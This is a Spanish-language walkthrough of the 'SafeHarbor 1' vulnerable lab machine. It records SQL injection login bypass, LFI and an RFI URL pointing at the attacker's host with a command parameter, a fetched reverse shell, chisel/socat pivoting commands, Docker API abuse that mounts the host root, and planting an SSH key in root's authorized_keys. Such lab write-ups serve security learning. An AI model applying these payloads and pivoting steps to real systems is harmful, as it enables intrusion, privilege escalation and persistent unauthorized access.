# SafeHarbor 1

Tags: [[_sqli]],[[_lfi]],[[_webExploitation]],[[_proxychains]],[[_pivoting]],[[_api]]

## Primeros pasos
(Reconocimiento).

Primero le acomodamos bien para que agarre una IP (poner modo Bridged).

Organizamos TMUX.
Hacemos un escaneo en la red para determinar la IP de la máquina.
Mediante el OUI reconocemos la máquina que vamos a atacar.

Le hacemos un ping a la máquina. (Está activa o no).
Posible máquina Linux.
Creamos un directorio como la IP o nombre de la máquina.
Ponemos la IP de la máquina en un lugar visible.
Creamos los directorios de trabajo.

Empezamos el escaneo con NMAP.

Buscamos codename con launchpad, un posible Ubuntu Bionic, pero nginx nos da a entender que puede ser un contenedor.

Puertos abiertos.

<span style="color:#ff669c">22</span> - SSH Version 7.6

<span style="color:#ff669c">80</span> - HTTP


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

<span style="color:#ff669c">22</span>.
No poseo credenciales válidas.
Es probable poder enumerar usuarios, cuando tenga algunos, los prueba.

<span style="color:#bef202">Vayamos al 80</span>.
Probemos enumerar usuarios, pero no es posible.


<span style="color:#ff669c">80</span>.
whatweb. Es un nginx, me pide una password, trabaja con PHP.

Pequeño fuzz con NMAP.
<span style="color:#ecacb6">/login.php</span> :    es el login.
<span style="color:#ecacb6">/phpinfo.php</span> :    se ve la información del PHP, como las funciones deshabilitadas.
<span style="color:#ecacb6">/changelog.txt</span>

Desde la web.
Es un panel de inicio de sesión.
Parece que es <span style="color:#ff2dc0">Harbor Back Obline v2</span> 
El código fuente no dice mucho.

<span style="color:#bef202">Vayamos al 22</span>.

Probemos una inyección SQL, probamos
<span style="color:#ecacb6">' or 1=1-- -</span>:    y entramos.

Enumerar la web.
Probamos LFI, pero juguemos en base64, pero nada.
Tratemos de apuntar a los archivos que sí están (welcome, about, etc). Me salen errores si se hace mal el wrapper, pero sí obtengo el base64 de los archivos.
Esto es estupendo, porque puedo ver su código.
Vale, a traernos todos y analizamos.

Tenemos esta información.
<span style="color:#ecacb6">mysqli_connect('mysql', 'root', 'TestPass123!', 'HarborBankUsers')</span>
Pero poco más.

Probar RFI, SSRF en la URL.
Confirmamos la whitelist, porque si pongo, con base64, <span style="color:#ecacb6">https:google.com/welcome</span> me detecta el welcome, pero me salen errores (obvio, ahí no existe xd).

Esto me hace pensar en crear un archivo en mi máquina que se llame igual, para ver si lo representa.
Me dice que hay errores, seguro que es porque está tratando de interpretar el PHP, y como no hace nada, truena (yo tengo los archivos reales en mi equipo, si hago mi server ahí, funciona con normalidad). Podría modificar el welcome real que tengo para hacer cambios mínimos pero significativos.

Pensando, solo hace falta crear un PHP llamado igual, para que pueda poner como parámetro un comando.
Así se ve en la URL: <span style="color:#ecacb6">http://192.168.0.32/OnlineBanking/index.php?p=http://192.168.0.13/balance&cmd=id</span>

Intentamos acceder al sistema.
Está complicado, así que usamos el script de PHP, de MokeyPentester. Y pa deeentro.

Importante. Estando dentro, uso <span style="color:#ff2dc0">wget</span> para descargar el PHP de la reverse, lo ejecutamos para mandarnos una <span style="color:#ff2dc0">shell</span> independizada.

## Escalada

Enumerar todo el sistema.
Efectivamente, .

Estoy en un segmento raro, seguramente haya algún otro equipo configurado en la misma red.
Dicho equipo puede ser la máquina real u otro contenedor.

Podría pensar en usar chisel.
Porque vemos con arp -a y arp -n que está un servidor de mysql, y nosotros tenemos credenciales.

Así que vamos a usar chisel y tener comunicación en los equipos.

Usamos las credenciales de acceso a la base datos y nos conectamos al host debido.
Las contraseñas que nos dan son de acceso en el panel, no son para otras cosas.

Así que toca enumerar los demás equipos, al hacer el escaneo de los puertos más comunes de los posibles equipos (<span style="color:#ecacb6">172.20.0.{}</span>, con xargs), al volver a hacer un arp -n se ven más equipos.

<span style="color:#bef202">Enumerando equipos.</span> (<span style="color:#ecacb6">172.20.0.*</span>)

<span style="color:#ecacb6">124</span>
<span style="color:#ff669c">9200</span> - wap-wsp
<span style="color:#ff669c">9300</span> - vrace
En la web
En 9300 no se ve mucho.
En 9200 se ve que obtengo datos de alguna api. Si yo pongo algo en la URL, me lo representa, dependiendo de qué es, me manda mensajes de error. Si añado <span style="color:#ecacb6">_search?</span>, me salen más datos, es el parámetro para buscar.

Usamos el RCE en searchsploit, pasamos por el proxy y le pasamos la IP.
Entramos como root (nos mandamos una reverse shell, con socat, no jala). 
Los ping sí funcionan.

Vemos el historial de root, y hace curl a <span style="color:#ecacb6">http://172.20.0.1:2375/</span> :    puerto de Docker, ojito.
Lo hacemos en la misma máquina y nos muestra cosas.
Seguimos esto: https://madhuakula.com/content/attacking-and-auditing-docker-containers-using-opensource/attacking-docker-containers/misconfiguration.html para un poco más de información.


Podríamos llegar a ver las imágenes de docker.

Pero pasando desde mi máquina por el primer túnel, no llegamos (<span style="color:#379075">es la máquina real, quiero pensar que es por eso que no la vemos aunque tengamos todo el segmento</span>).
Debemos hacer otro para tener conectividad, porque es la otra máquina la que sí llega. Debemos conectarnos al nodo más cercano (<span style="color:#ecacb6">172.20.0.4</span>) a un puerto (como 6565), que con socat redirigiré a mi máquina.
Abriré el 8888.

En la máquina <span style="color:#ecacb6">172.20.0.124</span>
<span style="color:#88c425">./chisel client 172.20.0.4:6565 R:8888:socks</span>

En la máquina <span style="color:#ecacb6">172.20.0.4</span>
<span style="color:#88c425">./socat TCP-LISTEN:6565,fork TCP:192.168.0.13:1234</span> :    mi puerto de mi servidor, siempre es ese donde recibo las conexiones.

Recordemos desactivar el <span style="color:#ff2dc0">dynamic_chain</span> y desactivar el <span style="color:#ff2dc0">strict_chain</span>.


Ahora que llegamos, enumeremos la API de docker.
Vemos que al enumerar imágenes, vemos una que tiene <span style="color:#ecacb6">debian:jessie</span>

Pero intentemos crear un contenedor, con una montura para montar la raíz de la máquina real, en un contenedor que yo despliegue. 

Checar.
https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker :    la parte de <span style="color:#ecacb6">Curl</span>.
Vamos ejecutando cada línea de las peticiones con curl para crear un contenedor.

1.-
Ajustar todo bien
+La IP de la máquina víctima y el puerto
+El http://... entre doble comillas
+Poner una imagen existente, como "alpine:3.2".

Nos da un identificador: <span style="color:#ecacb6">321f976698dbe4245d5654ec9db59a3683728a5b1491915d9b9ea49cff1f2b27</span>
2.-
+La IP de la máquina y el puerto.
+Colocamos el identificar anteriormente obtenido.

3.-
+La IP de la máquina y el puerto.
+Nuevamente colocamos el identificar anteriormente obtenido.
+El comando a ejecutar será, primeramente,
"ls -la /mnt/root" :    que será el de la máquina real (<span style="color:#379075">eso tratamos de ver</span>), porque es una montura.

Me devuelve un identificador, con el cual podré ver el output del comando.

4.-
+La IP de la máquina y el puerto.
+Colocamos el identificador obtenido para ver el output del comando.
+Colocar: <span style="color:#ecacb6">--output -</span> al final del comando, para depositar el output.

Y logramos ver el contenido.

Nota. Debemos crear el identificador del comando cada vez.

¿Qué podemos hacer pues?
Introducir mi clave pública en el .ssh de root en la máquina real, ahora que ejecutamos comandos en ella.
Me copio mi clave pública.
En el comando a ejecutar le hago un echo (<span style="color:#379075">la clave sin comillas</span>) para depositarlo en <span style="color:#ecacb6">/mnt/root/.ssh/authorized_keys</span>

Una vez esto, nos conectamos y pa deeeentro.
FIN.

<span style="color:#ecacb6">3</span>
<span style="color:#ff669c">9600</span> - micromuse-ncpw

